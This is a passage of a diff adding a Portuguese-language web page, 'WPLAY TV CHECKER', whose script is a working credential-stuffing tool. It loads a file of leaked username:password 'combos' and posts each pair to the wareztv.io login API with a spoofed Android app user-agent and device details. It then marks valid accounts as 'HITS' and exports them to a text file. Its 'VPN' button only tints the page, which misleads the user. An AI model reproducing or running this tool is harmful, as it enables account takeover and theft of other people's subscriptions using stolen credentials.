+        const validStat = document.getElementById('validStat');
+        const invalidStat = document.getElementById('invalidStat');
+        const resultContainer = document.getElementById('resultContainer');
+        const resultsList = document.getElementById('resultsList');
+        const notification = document.getElementById('notification');
+        const vpnStatus = document.getElementById('vpnStatus');
+        const vpnIndicator = document.getElementById('vpnIndicator');
+        const vpnText = document.getElementById('vpnText');
+        
+        // Event Listeners
+        fileInput.addEventListener('change', handleFileSelect);
+        checkButton.addEventListener('click', toggleCheckOrStop);
+        clearButton.addEventListener('click', clearResults);
+        downloadButton.addEventListener('click', downloadResults);
+        vpnButton.addEventListener('click', toggleVPN);
+        filterButton.addEventListener('click', toggleFilter);
+        
+        // Redimensionar canvas quando a janela for redimensionada
+        window.addEventListener('resize', () => {
+            matrixCanvas.width = window.innerWidth;
+            matrixCanvas.height = window.innerHeight;
+            particlesCanvas.width = window.innerWidth;
+            particlesCanvas.height = window.innerHeight;
+        });
+        
+        // Funções
+        function handleFileSelect(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            fileName.textContent = file.name;
+            fileName.style.color = '#00ff88';
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                window.comboContent = e.target.result;
+                showNotification(`Arquivo "${file.name}" carregado com sucesso!`, 'success');
+            };
+            reader.readAsText(file);
+        }
+        
+        function toggleCheckOrStop() {
+            if (checking) {
+                // Se já está verificando, solicita parar
+                stopRequested = true;
+                showNotification('Parando verificação...', 'warning');
+            } else {
+                // Se não está verificando, inicia a verificação
+                checkAccounts();
+            }
+        }
+        
+        function toggleFilter() {
+            showOnlyValid = !showOnlyValid;
+            
+            if (showOnlyValid) {
+                filterButton.classList.add('active');
+                filterButton.innerHTML = '<span>Mostrar Todos</span>';
+                showNotification('Mostrando apenas contas válidas (HITS)', 'success');
+            } else {
+                filterButton.classList.remove('active');
+                filterButton.innerHTML = '<span>Mostrar Apenas Hits</span>';
+                showNotification('Mostrando todas as contas', 'success');
+            }
+            
+            // Atualizar a exibição dos resultados
+            updateResultsDisplay();
+        }
+        
+        function updateResultsDisplay() {
+            const resultItems = resultsList.querySelectorAll('.result-item');
+            
+            resultItems.forEach((item, index) => {
+                const result = results[index];
+                
+                if (showOnlyValid && !result.isValid) {
+                    item.classList.add('hidden');
+                } else {
+                    item.classList.remove('hidden');
+                }
+            });
+        }
+        
+        async function checkAccounts() {
+            if (checking) return;
+            
+            if (!window.comboContent) {
+                showNotification('Por favor, carregue um arquivo de combos primeiro.', 'warning');
+                return;
+            }
+            
+            const combos = window.comboContent.trim().split('\n').filter(line => line.trim() !== '');
+            if (combos.length === 0) {
+                showNotification('O arquivo não contém combos válidas.', 'warning');
+                return;
+            }
+            
+            checking = true;
+            stopRequested = false;
+            checkButton.disabled = false;
+            checkButton.className = 'btn btn-stop';
+            checkButton.innerHTML = '<span>⏹ Parar Verificação</span>';
+            
+            results = [];
+            clearResults();
+            
+            progressContainer.classList.remove('hidden');
+            statsContainer.classList.remove('hidden');
+            
+            for (let i = 0; i < combos.length; i++) {
+                // Verifica se foi solicitado parar
+                if (stopRequested) {
+                    progressText.textContent = `Verificação interrompida! ${i}/${combos.length} (${Math.round((i / combos.length) * 100)}%)`;
+                    showNotification(`Verificação interrompida! Processados ${i} de ${combos.length} itens.`, 'warning');
+                    break;
+                }
+                
+                const combo = combos[i].trim();
+                if (!combo) continue;
+                
+                const [username, password] = combo.split(':', 2);
+                if (!username || !password) continue;
+                
+                const result = await checkAccount(username.trim(), password.trim());
+                results.push(result);
+                
+                updateProgress(i + 1, combos.length);
+                updateStats();
+                addResultToUI(result);
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            checking = false;
+            stopRequested = false;
+            checkButton.disabled = false;
+            checkButton.className = 'btn btn-primary';
+            checkButton.innerHTML = '<span>Verificar Contas</span>';
+            
+            if (results.length > 0) {
+                downloadButton.classList.remove('hidden');
+                showNotification('Verificação concluída!', 'success');
+            }
+        }
+        
+        async function checkAccount(username, password) {
+            try {
+                const response = await fetch('https://auth1.wareztv.io/api/v2/auth', {
+                    method: 'POST',
+                    headers: {
+                        "Accept-Language": "pt",
+                        "Connection": "Close",
+                        "User-Agent": "Apache-HttpClient/Null (WPlay 9.1.2; Android 14; 23129RA5FL; 7722fc18bb98aa0c)",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                    },
+                    body: new URLSearchParams({
+                        "from": "ap",
+                        "username": `${encodeURIComponent(username)}@wareztv.io`,
+                        "password": encodeURIComponent(password),
+                        "packageName": "io.wareztv.android.one",
+                        "appName": "WPlay",
+                        "appVersion": "912",
+                        "buildBrand": "Redmi",
+                        "buildProduct": "sapphire_global",
+                        "buildBoard": "bengal",
+                        "buildABI": "arm64-v8a",
+                        "buildDisplay": "UKQ1.231207.002 release-keys",
+                        "buildModel": "23129RA5FL",
+                        "sysVersion": "14"
+                    })
+                });
+                
+                if (response.status === 200) {
+                    const data = await response.json();
+                    
+                    if (data.service) {
+                        const userInfo = data.user;
+                        const expirationDate = userInfo.end_time || null;
+                        const registrationTime = userInfo.reg_time || 'Indisponível';
+                        
+                        let formattedExpirationDate, diasRestantes, isValid;
+                        
+                        if (expirationDate) {
+                            formattedExpirationDate = formatDate(expirationDate);
+                            diasRestantes = calculateDaysRemaining(expirationDate);
+                            isValid = true;
+                        } else {
+                            formattedExpirationDate = "𝖀𝖓𝖑𝖎𝖒𝖎𝖙𝖊𝖉";
+                            diasRestantes = "IทԲ¡ท¡τy";
+                            isValid = false;
+                        }
+                        
+                        const formattedRegistrationTime = formatDate(registrationTime);
+                        const categoriasCanais = "Canais ao vivo • Esportes • Filmes • Séries • Documentários";
+                        const categoriasVOD = "Ação • Comédia • Drama • Terror • Animação";
+                        
+                        return {
+                            username,
+                            password,
+                            registrationTime: formattedRegistrationTime,
+                            expirationDate: formattedExpirationDate,
+                            diasRestantes,
+                            isValid,
+                            categoriasCanais,
+                            categoriasVOD
+                        };
+                    }
+                }
+                
+                return {
+                    username,
+                    password,
+                    registrationTime: '',
+                    expirationDate: '',
+                    diasRestantes: '',
+                    isValid: false,
+                    categoriasCanais: '',
+                    categoriasVOD: ''
+                };
+            } catch (error) {
+                console.error('Erro ao verificar conta:', error);
+                return {
+                    username,
+                    password,
+                    registrationTime: '',
+                    expirationDate: '',
+                    diasRestantes: '',
+                    isValid: false,
+                    categoriasCanais: '',
+                    categoriasVOD: ''
+                };
+            }
+        }
+        
+        function formatDate(dateString) {
+            try {
+                const date = new Date(dateString);
+                return date.toLocaleDateString('pt-BR');
+            } catch (e) {
+                return 'Data inválida';
+            }
+        }
+        
+        function calculateDaysRemaining(expirationDate) {
+            try {
+                const expiration = new Date(expirationDate);
+                const now = new Date();
+                const diffTime = Math.abs(expiration - now);
+                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+                return diffDays;
+            } catch (e) {
+                return 'Data inválida';
+            }
+        }
+        
+        function updateProgress(current, total) {
+            const percentage = Math.round((current / total) * 100);
+            progressFill.style.width = `${percentage}%`;
+            progressText.textContent = `Verificando... ${current}/${total} (${percentage}%)`;
+        }
+        
+        function updateStats() {
+            const total = results.length;
+            const valid = results.filter(r => r.isValid).length;
+            const invalid = total - valid;
+            
+            totalStat.textContent = total;
+            validStat.textContent = valid;
+            invalidStat.textContent = invalid;
+        }
+        
+        function addResultToUI(result) {
+            resultContainer.classList.remove('hidden');
+            
+            const resultItem = document.createElement('div');
+            resultItem.className = `result-item ${result.isValid ? 'valid' : 'invalid'}`;
+            
+            // Aplicar filtro se estiver ativo
+            if (showOnlyValid && !result.isValid) {
+                resultItem.classList.add('hidden');
+            }
+            
+            const header = document.createElement('div');
+            header.className = 'result-header';
+            header.innerHTML = `
+                <span>CONFG BY @Negret's player</span>
+                <span class="result-status ${result.isValid ? 'valid' : 'invalid'}">
+                    ${result.isValid ? '✅ VÁLIDA' : '❌ INVÁLIDA'}
+                </span>
+            `;
+            
+            const details = document.createElement('div');
+            details.className = 'result-details';
+            
+            if (result.isValid) {
+                details.innerHTML = `
+                    <div class="detail-item">
+                        <div class="detail-label">USUÁRIO</div>
+                        <div class="detail-value">${result.username}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">SENHA</div>
+                        <div class="detail-value">${result.password}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">CRIADA</div>
+                        <div class="detail-value">${result.registrationTime}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">EXPIRA</div>
+                        <div class="detail-value">${result.expirationDate}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">RESTAM</div>
+                        <div class="detail-value">${result.diasRestantes} DIAS</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">CATEGORIAS TV</div>
+                        <div class="detail-value">${result.categoriasCanais}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">FILMES E SÉRIES</div>
+                        <div class="detail-value">${result.categoriasVOD}</div>
+                    </div>
+                `;
+            } else {
+                details.innerHTML = `
+                    <div class="detail-item">
+                        <div class="detail-label">SERVIDOR</div>
+                        <div class="detail-value">wareztv.io</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">USUÁRIO</div>
+                        <div class="detail-value">${result.username}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">SENHA</div>
+                        <div class="detail-value">${result.password}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">HITS ON</div>
+                        <div class="detail-value">${results.filter(r => r.isValid).length}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">HITS OFF</div>
+                        <div class="detail-value">${results.filter(r => !r.isValid).length}</div>
+                    </div>
+                `;
+            }
+            
+            resultItem.appendChild(header);
+            resultItem.appendChild(details);
+            resultsList.appendChild(resultItem);
+        }
+        
+        function clearResults() {
+            results = [];
+            resultsList.innerHTML = '';
+            progressContainer.classList.add('hidden');
+            statsContainer.classList.add('hidden');
+            resultContainer.classList.add('hidden');
+            downloadButton.classList.add('hidden');
+            window.comboContent = null;
+            fileInput.value = '';
+            fileName.textContent = 'Nenhum arquivo selecionado';
+            fileName.style.color = '';
+            showOnlyValid = false;
+            filterButton.classList.remove('active');
+            filterButton.innerHTML = '<span>Mostrar Apenas Hits</span>';
+        }
+        
+        function downloadResults() {
+            const validResults = results.filter(r => r.isValid);
+            if (validResults.length === 0) {
+                showNotification('Não há resultados válidos para baixar.', 'warning');
+                return;
+            }
+            
+            let content = "╔══════════════════════════════════════════════════════════════════════════════╗\n";
+            content += "║                           WPLAY TV CHECKER v2.0                              ║\n";
+            content += "║                          CÓDIGO FEITO POR @Negret's player                    ║\n";
+            content += "╚══════════════════════════════════════════════════════════════════════════════╝\n\n";
+            
+            validResults.forEach(result => {
+                content += "╔══[▐▐ 𝐂𝐎𝐍𝐅𝐈𝐆 𝐖𝐏𝐋𝐀𝐘 𝐓𝐕 ▐▐  ]══\n";
+                content += "║∘CONFG BY @Negret's player\n";
+                content += `║∘USERNAMES ➨ ${result.username}\n`;
+                content += `║∘PASSWORD ➨ ${result.password}\n`;
+                content += `║∘CRIADA ➨ ${result.registrationTime}\n`;
+                content += `║∘EXPIRA ➨ ${result.expirationDate}\n`;
+                content += `║∘RESTAM ➨ ${result.diasRestantes} DIAS\n`;
+                content += "╚══┃▐▐ ❝ 𝐖𝐏𝐋𝐀𝐘 𝐓𝐕 ❞▐▐ ┃═══\n";
+                content += `╔════「𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐀𝐒  𝐓𝐕」\n╚══∘[ ${result.categoriasCanais} ]#L¡√૯\n`;
+                content += `╔════「 𝐅𝐈𝐋𝐌𝐄𝐒 𝐄 𝐒𝐄𝐑𝐈𝐒 」\n╚══∘[ ${result.categoriasVOD} ]#Vѳ∂\n\n`;
+            });
+            
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'LOGINS-WPLAY-TV.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showNotification('Arquivo de HITS baixado com sucesso!', 'success');
+        }
+        
+        function toggleVPN() {
+            vpnActive = !vpnActive;
+            
+            if (vpnActive) {
+                vpnButton.innerHTML = '<span>Desativar VPN</span>';
+                vpnIndicator.classList.add('active');
+                vpnText.textContent = 'VPN: ON';
+                showNotification('VPN ativada! Conexão mais segura.', 'success');
+                
+                document.body.style.filter = 'hue-rotate(5deg) saturate(1.1)';
+            } else {
+                vpnButton.innerHTML = '<span>Ativar VPN</span>';
+                vpnIndicator.classList.remove('active');
+                vpnText.textContent = 'VPN: OFF';
+                showNotification('VPN desativada.', 'warning');
+                
+                document.body.style.filter = 'none';
+            }
+        }
+        
+        function showNotification(message, type = 'info') {
+            notification.textContent = message;
+            notification.className = `notification ${type}`;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
